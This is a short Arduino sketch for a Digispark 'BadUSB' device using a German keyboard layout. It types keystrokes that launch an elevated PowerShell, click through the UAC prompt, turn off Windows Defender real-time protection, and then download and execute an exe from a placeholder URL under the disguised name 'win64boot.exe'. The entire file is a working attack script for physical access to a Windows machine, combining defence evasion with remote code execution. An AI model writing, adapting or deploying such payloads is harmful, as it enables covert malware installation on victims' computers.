#include <DigiKeyboardDe.h>
//German Layout!!!

void setup() {

    //start
    DigiKeyboardDe.sendKeyStroke(0);
    DigiKeyboardDe.delay(1000);

    //start Powershell as admin
    DigiKeyboardDe.sendKeyStroke( KEY_R, MOD_GUI_LEFT);
    DigiKeyboardDe.delay(1000);
    DigiKeyboardDe.println("powershell Start-Process powershell -Verb runAs");
    DigiKeyboardDe.delay(1500);  
    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);  
    DigiKeyboardDe.delay(300);  
    DigiKeyboardDe.sendKeyStroke(KEY_ENTER); 
    DigiKeyboardDe.delay(700);  
        
    //disableDefender
    DigiKeyboardDe.print("Set-MpPreference  -DisableRealtimeMonitoring $true");
    DigiKeyboardDe.delay(300);
    DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
    DigiKeyboardDe.delay(300);
    //Downlaod and run
    DigiKeyboardDe.delay(300);
    DigiKeyboardDe.println("$down = New-Object System.Net.WebClient; $url = 'https://example.example/exploit.exe'; $file = 'win64boot.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
}

void loop() {}
